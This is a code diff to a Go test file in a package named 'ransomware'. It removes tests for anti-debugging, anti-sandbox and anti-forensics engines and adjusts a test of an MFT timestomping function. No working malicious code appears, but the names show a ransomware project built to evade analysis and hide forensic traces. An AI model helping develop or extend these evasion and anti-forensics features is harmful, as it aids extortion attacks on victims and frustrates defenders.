@@ -2,81 +2,8 @@ package ransomware
 
 import (
 	"testing"
+	"time"
 )
-
-func TestNewAntiReversingEngine(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	if e == nil {
-		t.Fatal("NewAntiReversingEngine() returned nil")
-	}
-}
-
-func TestAntiReversingIsDebuggerPresent(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.IsDebuggerPresent()
-	t.Logf("IsDebuggerPresent: %v (expected false in test env)", result)
-}
-
-func TestAntiReversingCheckRemoteDebugger(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.CheckRemoteDebugger()
-	t.Logf("CheckRemoteDebugger: %v (expected false in test env)", result)
-}
-
-func TestAntiReversingVerifyIntegrity(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	ok, stored, computed := e.VerifyIntegrity()
-	t.Logf("VerifyIntegrity: ok=%v stored=%d computed=%d", ok, stored, computed)
-}
-
-func TestAntiReversingTimingCheck(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.TimingCheck()
-	t.Logf("TimingCheck: %v", result)
-}
-
-func TestAntiReversingRDTSCCheck(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.RDTSCCheck()
-	if result == 0 {
-		t.Log("RDTSCCheck returned 0 (expected in non-native env)")
-	}
-}
-
-func TestAntiReversingAntiSandboxDetect(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.AntiSandboxDetect()
-	t.Logf("AntiSandboxDetect: %v", result)
-}
-
-func TestAntiReversingMACOUIRandomCheck(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.MACOUIRandomCheck()
-	t.Logf("MACOUIRandomCheck: %v", result)
-}
-
-func TestAntiReversingFullAntiDebugSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	e := NewAntiReversingEngine(cfg)
-	result := e.FullAntiDebugSuite()
-	if result == nil {
-		t.Fatal("FullAntiDebugSuite returned nil")
-	}
-	if len(result) == 0 {
-		t.Error("FullAntiDebugSuite returned empty map")
-	}
-	for k, v := range result {
-		t.Logf("  %s: %v", k, v)
-	}
-}
 
 func TestNewAntiAnalysisEngine(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
@@ -125,28 +52,8 @@ func TestAntiAnalysisEnterSleepMode(t *testing.T) {
 	t.Log("EnterSleepMode(0) completed without panic")
 }
 
-func TestNewAntiForensicsAdvanced(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	a := NewAntiForensicsAdvanced(cfg)
-	if a == nil {
-		t.Fatal("NewAntiForensicsAdvanced() returned nil")
-	}
-}
-
-func TestAntiForensicsAdvancedFullSuite(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	a := NewAntiForensicsAdvanced(cfg)
-	result := a.FullAntiForensicsSuite()
-	if result == nil {
-		t.Fatal("FullAntiForensicsSuite returned nil")
-	}
-	for k, v := range result {
-		t.Logf("  %s: %v", k, v)
-	}
-}
-
 func TestMFTTimestomp(t *testing.T) {
-	err := MFTTimestomp("/tmp/test_mft_timestomp", 0)
+	err := MFTTimestomp("/tmp/test_mft_timestomp", time.Time{})
 	t.Logf("MFTTimestomp: %v (expected error in non-Windows env)", err)
 }
 
